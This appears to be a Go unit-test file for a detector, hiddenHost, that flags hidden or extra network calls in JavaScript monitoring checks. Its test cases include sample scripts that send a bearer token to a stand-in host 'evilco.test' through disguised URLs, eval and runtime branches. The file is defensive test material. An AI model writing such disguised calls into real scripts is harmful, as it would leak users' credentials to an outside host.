package aichecks

import (
	"testing"

	"github.com/stretchr/testify/require"
)

const hiddenPrevious = `var auth = { headers: { Authorization: "Bearer " + secrets.TOKEN } };
var r = http.get(env.BASE_URL + "/api", auth);
return { status: r.statusCode === 200 ? "up" : "down" };`

// hiddenHost fails closed: any call site whose host the text does not show,
// or one network call more than the previous version, is hidden.
func TestHiddenHost(t *testing.T) {
	t.Parallel()

	env := map[string]string{"BASE_URL": "https://acme.test", "API": "https://acme.test/v1/"}
	call := func(target string) string {
		return `var auth = { headers: { Authorization: "Bearer " + secrets.TOKEN } };
var r = http.get(` + target + `, auth);
return { status: r.statusCode === 200 ? "up" : "down" };`
	}

	cases := []struct {
		name, candidate string
		hidden          bool
	}{
		{"same call, other selector", call(`env.BASE_URL + "/api/v2"`), false},
		{"url literal", call(`"https://acme.test/api"`), false},
		{"open url literal and a path", call(`"https://acme.test" + "/api"`), false},
		{"closed env url and a variable", call(`env.API + path`), false},
		{"env read by literal key", call(`env["BASE_URL"] + "/api"`), false},
		{
			"comment and string mention",
			"// http.get(x)\n" + call(`env.BASE_URL + "/api"`) + `; var s = "http.get(y)";`, false,
		},
		{"variable", call(`url`), true},
		{"env joined to a host", call(`env.BASE_URL + "@evilco.test/"`), true},
		{"env method call", call(`env.BASE_URL.replace("acme", "evilco")`), true},
		{"open url literal joined", call(`"https://acme.test" + ".evilco.test/"`), true},
		{"literal pieces", call(`"http:" + "//acme.test/api"`), true},
		{"template", call("`https://${host}/api`"), true},
		{"dynamic env key", call(`env[name]`), true},
		{"computed verb on a visible target", "var m = \"get\";\n" + `var r = http[m](env.BASE_URL + "/api");`, false},
		{"computed eval", `globalThis["ev" + "al"]("http.get(env.BASE_URL)"); return { status: "up" };`, true},
		{"eval", `eval("http.get(env.BASE_URL)"); return { status: "up" };`, true},
		{"sub-check", `var c = solidping.http({ url: env.BASE_URL }); return { status: "up" };`, true},
		{"session verb", `var s = http.session(); var r = s.get(u); return { status: "up" };`, true},
		{
			"extra literal call",
			hiddenPrevious + "\nhttp.get(\"https://acme.test/x\");",
			true,
		},
		{
			"kept literal plus runtime branch",
			hiddenPrevious + "\nif (Date.now() > 0) { http.get(\"https://\" + h + \"/\", auth); }",
			true,
		},
		{"no-argument call", `browser.open(); var r = http.get(env.BASE_URL + "/api"); return { status: "up" };`, false},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			got := hiddenHost(hiddenPrevious, tc.candidate, env)
			if tc.hidden {
				require.NotEmpty(t, got)
			} else {
				require.Empty(t, got)
			}
		})
	}
}

func TestHiddenHostQuotesTheCallSite(t *testing.T) {
	t.Parallel()

	candidate := hiddenPrevious + "\nif (Date.now() > 0) { http.get(\"https://\" + h + \".evilco.test/\", auth); }"
	require.Equal(t, `http.get("https://" + h + ".evilco.test/", auth)`,
		hiddenHost(hiddenPrevious, candidate, nil))
}
